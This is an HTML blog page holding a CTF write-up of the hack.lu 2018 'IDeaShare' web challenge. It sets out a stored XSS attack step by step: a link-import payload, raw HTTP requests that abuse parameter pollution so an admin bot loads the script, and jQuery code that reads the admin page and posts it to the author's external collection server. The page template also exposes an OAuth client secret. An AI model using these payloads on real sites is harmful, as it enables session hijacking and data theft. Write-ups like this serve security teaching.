@@ -1,0 +1,765 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="ctf,writeup," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="First, there is a textarea for you to write your idea, some key words were blocked, but we can use link to import external resources, payload like this: 1&amp;lt;link/rel=import href=https://https.zer0b.c">
+<meta name="keywords" content="ctf,writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hacklu CTF 2018-IDeaShare-writeup(After the end of the CTF)">
+<meta property="og:url" content="https://www.zer0i3.com/2018/10/21/hacklu-ctf-2018-ideashare-en/index.html">
+<meta property="og:site_name" content="zer0i3&#39;s Notes">
+<meta property="og:description" content="First, there is a textarea for you to write your idea, some key words were blocked, but we can use link to import external resources, payload like this: 1&amp;lt;link/rel=import href=https://https.zer0b.c">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://www.zer0i3.com/2018/10/21/hacklu-ctf-2018-ideashare-en/hacklu-ctf-2018-ideashare-en/http_console_err.png">
+<meta property="og:image" content="https://www.zer0i3.com/2018/10/21/hacklu-ctf-2018-ideashare-en/hacklu-ctf-2018-ideashare-en/access_control_err.png">
+<meta property="og:image" content="https://www.zer0i3.com/2018/10/21/hacklu-ctf-2018-ideashare-en/hacklu-ctf-2018-ideashare-en/shares.png">
+<meta property="og:image" content="https://www.zer0i3.com/2018/10/21/hacklu-ctf-2018-ideashare-en/hacklu-ctf-2018-ideashare-en/image-20181021171619823.png">
+<meta property="og:image" content="https://www.zer0i3.com/2018/10/21/hacklu-ctf-2018-ideashare-en/hacklu-ctf-2018-ideashare-en/httponly.png">
+<meta property="og:image" content="https://www.zer0i3.com/2018/10/21/hacklu-ctf-2018-ideashare-en/hacklu-ctf-2018-ideashare-en/admin.png">
+<meta property="og:image" content="https://www.zer0i3.com/2018/10/21/hacklu-ctf-2018-ideashare-en/hacklu-ctf-2018-ideashare-en/flag.png">
+<meta property="og:updated_time" content="2018-10-21T09:59:03.513Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="hacklu CTF 2018-IDeaShare-writeup(After the end of the CTF)">
+<meta name="twitter:description" content="First, there is a textarea for you to write your idea, some key words were blocked, but we can use link to import external resources, payload like this: 1&amp;lt;link/rel=import href=https://https.zer0b.c">
+<meta name="twitter:image" content="https://www.zer0i3.com/2018/10/21/hacklu-ctf-2018-ideashare-en/hacklu-ctf-2018-ideashare-en/http_console_err.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://www.zer0i3.com/2018/10/21/hacklu-ctf-2018-ideashare-en/"/>
+
+
+
+
+
+  <title>hacklu CTF 2018-IDeaShare-writeup(After the end of the CTF) | zer0i3's Notes</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">zer0i3's Notes</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://www.zer0i3.com/2018/10/21/hacklu-ctf-2018-ideashare-en/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="zer0i3">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="zer0i3's Notes">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">hacklu CTF 2018-IDeaShare-writeup(After the end of the CTF)</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-21T17:53:10+08:00">
+                2018-10-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/10/21/hacklu-ctf-2018-ideashare-en/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count gitment-comments-count" data-xid="/2018/10/21/hacklu-ctf-2018-ideashare-en/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>First, there is a textarea for you to write your idea, some key words were blocked, but we can use <code>link</code> to import external resources, payload like this:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span>/<span class="attr">rel</span>=<span class="string">import</span> <span class="attr">href</span>=<span class="string">https://https.zer0b.com/BlueLotus_XSSReceiver/myjs/tester.js</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>After save this as first idea, we can access url below to bring the js  into effect:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://arcade.fluxfingers.net:1818/?page=view&amp;raw&amp;owner=304&amp;pad=1</span><br></pre></td></tr></table></figure>
+<p>There are some restrictions when we use the <code>link</code> tag:</p>
+<ul>
+<li><p>the href attribute must start with <code>https</code>, when use <code>http</code> will look like this:</p>
+<p><img src="./hacklu-ctf-2018-ideashare-en/http_console_err.png" alt="image-20181019215815504"></p>
+<p>So  you should have a domain name and <code>let&#39;s encrypt</code> will help you with configing https.</p>
+</li>
+<li><p>you must set <code>Access-Control-Allow-Origin</code> to make it possible link js from your site, or you will get this:<img src="./hacklu-ctf-2018-ideashare-en/access_control_err.png" alt="image-20181019221619447"></p>
+<p>the nginx config is blow:</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">add_header</span> Access-Control-Allow-Origin *;</span><br><span class="line"><span class="attribute">add_header</span> Access-Control-Allow-Methods <span class="string">'GET, POST, OPTIONS'</span>;</span><br><span class="line"><span class="attribute">add_header</span> Access-Control-Allow-Headers <span class="string">'DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization'</span>;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>Then XSS can be successfully triggered when we visit this page(<code>https://arcade.fluxfingers.net:1818/?page=view&amp;raw&amp;owner=304&amp;pad=1</code>)</p>
+<p><img src="./hacklu-ctf-2018-ideashare-en/shares.png" alt="image-20181019222416066"></p>
+<p>We know from <code>about</code> page that:<code>An Admin will check your IDea and evaluate it.</code>  But in our shares list, url like this:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">?page</span>=<span class="string">view&amp;owner</span>=<span class="string">304&amp;pad</span>=<span class="string">3</span>&gt;</span>IDea Number 3<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>Obviously the <strong>raw</strong> parameter is missing here, Admin will not trigger our XSS when he check ideas.</p>
+<p>We found a <code>parameter pollution</code> vulnerability here, then we can construct such url to create a new idea:</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?page=idea&amp;pad=1%26raw</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: arcade.fluxfingers.net:1818</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Length</span>: 110</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Origin</span>: https://arcade.fluxfingers.net:1818</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.67 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"><span class="attribute">Referer</span>: https://arcade.fluxfingers.net:1818/?page=idea&amp;pad=1</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=l04isu07e7tg4m6gn0hsp95ses; session=b956181dfc30a872a190a76406c63e0dc9ab2c373193554c28174f6596e95aa59f41b5dd</span><br><span class="line"></span><br><span class="line">idea=%3Clink%2Frel%3Dimport+href%3Dhttps%3A%2F%2Fhttps.zer0b.com%2FBlueLotus_XSSReceiver%2Fmyjs%2Ftester.js%3E</span><br></pre></td></tr></table></figure>
+<p>Please note that the name of the pad is <code>1%26raw</code>, and we share this idea:</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?page=idea&amp;pad=1%26raw</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: arcade.fluxfingers.net:1818</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Length</span>: 341</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Origin</span>: https://arcade.fluxfingers.net:1818</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.67 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"><span class="attribute">Referer</span>: https://arcade.fluxfingers.net:1818/?page=idea&amp;pad=1%26raw</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=l04isu07e7tg4m6gn0hsp95ses; session=b956181dfc30a872a190a76406c63e0dc9ab2c373193554c28174f6596e95aa59f41b5dd</span><br><span class="line"></span><br><span class="line">share=&amp;g-recaptcha-response=03AMGVjXhpe6wbk65KVTuzy2kfsLDT8duce0LwPj18Mec_vBg_6GvZJaBlETmfIoFRCTS-OpEk4KPm5FzfwEAQsfnSxbv_jj80RKuppequjTau-YmmNiy_Om3tbcuJUGGz3sxjMaF75uGQqVJCWpMKua-jBED5ahDSFab2ZP_Pomi9FxVFBcSxkfgYhiu9xpT7wLLbL43rO1SeExQGRBhBp9Yp5fnBfyLFB4b6KloNQ18QmVKBDXTajuUuZoFKM_gmRZs2bu5138xged-JNAuxdpOv7HLoSLpS7ukB0R_REGv5HlQULAofOQs</span><br></pre></td></tr></table></figure>
+<p>We can found a new url in shares list:</p>
+<p><img src="./hacklu-ctf-2018-ideashare-en/image-20181021171619823.png" alt="image-20181021171619823"></p>
+<p>and it’s url like this:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">?page</span>=<span class="string">view&amp;owner</span>=<span class="string">304&amp;pad</span>=<span class="string">1&amp;amp;raw</span>&gt;</span>IDea Number 1&amp;amp;raw<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>Xss will be triggered when the administrator accesses this url.</p>
+<p><img src="./hacklu-ctf-2018-ideashare-en/httponly.png" alt="image-20181021172716373"></p>
+<p>Cookie is set to be httpOnly, so we can’t reveive cookie in XSS platform.</p>
+<p><img src="./hacklu-ctf-2018-ideashare-en/admin.png" alt="image-20181021173018469"></p>
+<p>We access admin page with js, and payload in tester.js like this:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.staticfile.org/jquery/1.10.2/jquery.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">    var xss_url='https://https.zer0b.com/BlueLotus_XSSReceiver/index.php';</span></span><br><span class="line"><span class="undefined">    //admin page</span></span><br><span class="line"><span class="undefined">    $.get("/?page=admin",async=false,function(result)&#123;</span></span><br><span class="line"><span class="undefined">        $.post(xss_url,data="admin_content="+result,async=false);</span></span><br><span class="line"><span class="undefined">    &#125;);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>We received the content of the admin page, the most important part of which is this：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">action</span>=<span class="string">"?page=admin"</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"password"</span>&gt;</span>Winner ID<span class="tag">&lt;/<span class="name">label</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"userid"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> /&gt;</span> </span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span>&gt;</span>Submit<span class="tag">&lt;/<span class="name">button</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>Then construct payload in tester.js</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.staticfile.org/jquery/1.10.2/jquery.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">    var xss_url='https://https.zer0b.com/BlueLotus_XSSReceiver/index.php';</span></span><br><span class="line"><span class="undefined">    //admin page</span></span><br><span class="line"><span class="undefined">    $.post("/?page=admin",&#123; userid:"720" &#125;,async=false);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>We got the flag:</p>
+<p><img src="./hacklu-ctf-2018-ideashare-en/flag.png" alt="image-20181021175039661"></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+            <a href="/tags/writeup/" rel="tag"># writeup</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/10/14/ltshop-writeup/" rel="next" title="护网杯ltshop题解">
+                <i class="fa fa-chevron-left"></i> 护网杯ltshop题解
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      
+        <div id="gitment-container"></div>
+      
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">zer0i3</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">zer0i3</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+  <script type="text/javascript">
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//tajs.qq.com/stats?sId=66079834";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+<!-- LOCAL: You can save these files to your site and update links -->
+    
+        
+        <link rel="stylesheet" href="https://aimingoo.github.io/gitmint/style/default.css">
+        <script src="https://aimingoo.github.io/gitmint/dist/gitmint.browser.js"></script>
+    
+<!-- END LOCAL -->
+
+    
+
+    
+      <script type="text/javascript">
+      function renderGitment(){
+        var gitment = new Gitmint({
+            id: window.location.pathname, 
+            owner: 'zer0i3',
+            repo: 'zer0i3.github.io',
+            
+            lang: "" || navigator.language || navigator.systemLanguage || navigator.userLanguage,
+            
+            oauth: {
+            
+            
+                client_secret: '4afba76efe2af979400b202ecea69096b8752f41',
+            
+                client_id: '6ee09384d4c95af87f91'
+            }});
+        gitment.render('gitment-container');
+      }
+
+      
+      renderGitment();
+      
+      </script>
+    
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
